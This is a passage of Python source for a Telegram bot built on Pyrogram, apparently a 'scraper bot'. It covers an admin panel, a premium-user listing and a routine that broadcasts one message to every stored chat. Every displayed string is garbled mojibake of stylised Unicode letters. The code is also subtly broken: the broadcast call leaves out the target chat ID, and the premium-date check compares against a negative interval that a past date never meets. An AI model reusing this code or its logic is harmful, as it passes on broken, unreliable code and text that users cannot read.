         E="**üî¥  ú·¥á Ä·¥á …™s  è·¥è·¥ú Ä ·¥Ä ü ü ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥ús·¥á Äs üîµ**\n"
         a=0
         for row in rows:
            d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
            r = datetime.strptime("2023-02-01", '%Y-%m-%d') - datetime.strptime("2023-12-01", '%Y-%m-%d')
            if d<=r:
               a+=1
               E+=f"{a}). {row[1]} - {row[2]}\n"          
         await app.send_message(update.message.chat.id, text=E)

   elif "Admin" in k:  
      await update.message.delete()    
      if update.message.chat.id in OWNERS:
         but = InlineKeyboardMarkup(
              [
                 [
                    InlineKeyboardButton("‚ôªÔ∏è ·¥Ä·¥Ö·¥Ö ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ‚ôªÔ∏è", callback_data="Add_Premium")
                 ],
                 [  
                    InlineKeyboardButton("‚≠ï  ô Ä·¥è·¥Ä·¥Ö·¥Ñ·¥Äs·¥õ ‚≠ï", callback_data="Broadcast")
                 ],
                 [
                    InlineKeyboardButton("üçí  ô·¥è·¥õs s·¥õ·¥Ä·¥õs üçí", callback_data="Bot_Stats")
                 ],
                 [
                    InlineKeyboardButton("üî¥ ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥ús·¥á Äs üîµ", callback_data="Premium_Users")
                 ]
              ]
         )
         await app.send_message(update.message.chat.id,text=f"**·¥°·¥á ü·¥Ñ·¥è·¥ç·¥á ·¥õ·¥è ·¥Ä·¥Ö·¥ç…™…¥ ·¥ò·¥Ä…¥…¥·¥á ü ·¥è“ì ·¥õ ú·¥á s·¥Ñ Ä·¥Ä·¥ò·¥á Ä  ô·¥è·¥õ**", reply_markup=but)
      else:
         await app.send_message(update.message.chat.id,text="** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è·¥õ ·¥è·¥°…¥·¥á Ä ·¥è“ì  ô·¥è·¥õ**")

   elif "Broadcast" in k:
    try:
      query = await query_msg()
      a=0
      b=0
      number = await update.message.chat.ask(text="**…¥·¥è·¥° ·¥ç·¥á ·¥ç·¥áss·¥Ä…¢·¥á “ì·¥è Ä  ô Ä·¥è·¥Ä·¥Ö·¥Ñ·¥Äs·¥õ**")
      phone = number.text
      for row in query:
         chat_id = int(row[0])
         try:
            await app.send_message(text=f"{phone}", parse_mode="markdown", disable_web_page_preview=True)
            a+=1
         except FloodWait as e:
            await asyncio.sleep(e.x)
            b+=1
         except Exception:
            b+=1
            pass
      await app.send_message(update.message.chat.id,f"‚úÖ s·¥ú·¥Ñ·¥áss“ì·¥ú ü ü è  ô Ä·¥è·¥Ä·¥Ö·¥Ñ·¥Äs·¥õ·¥á·¥Ö ·¥õ·¥è {a} ·¥Ñ ú·¥Ä·¥õs\n“ì·¥Ä…™ ü·¥á·¥Ö - {b} ·¥Ñ ú·¥Ä·¥õs !")
    except Exception as e:
      await app.send_message(update.message.chat.id,f"**·¥á Ä Ä·¥è Ä: {e}**")

# -------------------- ·¥Ä·¥Ö·¥ç…™…¥-·¥ò·¥Ä…¥…¥·¥á ü-·¥á…¥·¥Ö ---------------- #



text = """ ú·¥á ü ü·¥è …™ ·¥Ä·¥ç ·¥è·¥°…¥·¥á Ä ·¥è“ì  ô·¥è·¥õ ·¥ò ü·¥á·¥Äs·¥á ·¥ä·¥è…™…¥ ·¥ç è …¢ Ä·¥è·¥ú·¥ò ·¥Ñ ú·¥Ä…¥…¥·¥á üs
"""
print(text)
app.run()
